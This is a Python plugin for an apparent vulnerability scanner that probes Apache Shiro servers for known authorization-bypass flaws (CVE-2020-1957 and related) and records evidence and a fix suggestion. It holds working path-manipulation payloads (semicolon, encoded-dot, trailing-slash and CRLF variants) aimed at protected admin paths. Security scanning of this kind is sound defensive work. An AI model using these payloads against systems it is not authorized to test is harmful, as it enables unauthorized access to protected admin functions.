from app.scanner.base import BaseScanner
from app.scanner.loader import register_scanner
from app.utils.http_client import http_request
from app.utils.logger import get_logger

logger = get_logger("shiro_auth_bypass")


@register_scanner
class ShiroAuthBypassScanner(BaseScanner):
    name = "Apache Shiro 权限绕过漏洞"
    description = "Shiro路径匹配机制缺陷可绕过权限校验"
    category = "shiro"
    module = "shiro_auth_bypass"
    risk_level = "high"
    risk_score = 8
    cve_ids = ["CVE-2020-1957", "CVE-2020-11989", "CVE-2021-41303", "CVE-2022-32532"]
    references = [
        "https://nvd.nist.gov/vuln/detail/CVE-2020-1957",
    ]
    fix_suggestion = "升级Shiro至最新版本，统一使用Spring MVC进行路径管理，避免Shiro与Spring路径匹配差异"

    BYPASS_PAYLOADS = [
        "/{path}",        # CVE-2020-1957
        "/;/{path}",      # 分号绕过
        "/{path}/",       # 斜杠绕过
        "/%2e/{path}",    # URL编码绕过
        "/{path}%0d%0a",  # CRLF注入
    ]

    def check(self) -> bool:
        protected_paths = ["/admin", "/admin/", "/system", "/user/management", "/api/admin"]
        found = False

        base_resp = http_request("GET", f"{self.target}/")
        if base_resp is None:
            return False

        for protected in protected_paths:
            base_url = f"{self.target}{protected}"
            base_req = http_request("GET", base_url)
            if base_req is None or base_req.status_code != 403:
                continue

            for pattern in self.BYPASS_PAYLOADS:
                bypass_path = pattern.replace("{path}", protected.lstrip("/"))
                bypass_url = f"{self.target}{bypass_path}"
                bypass_resp = http_request("GET", bypass_url, allow_redirects=False)

                if bypass_resp is None:
                    continue

                if bypass_resp.status_code in [200, 302]:
                    self.add_result(
                        name=f"Shiro权限绕过 ({pattern})",
                        risk_level="high",
                        risk_score=8,
                        target_url=bypass_url,
                        detail=f"通过路径 {bypass_path} 绕过权限校验 (原始路径 {protected} 返回403)",
                        payload=bypass_path,
                        request_data=f"GET {bypass_url}",
                        response_snippet=bypass_resp.text[:300] if bypass_resp.status_code == 200 else f"302 -> {bypass_resp.headers.get('Location', '')}",
                        evidence=f"原始请求返回403，绕过请求返回{bypass_resp.status_code}",
                    )
                    found = True
                    break
        return found
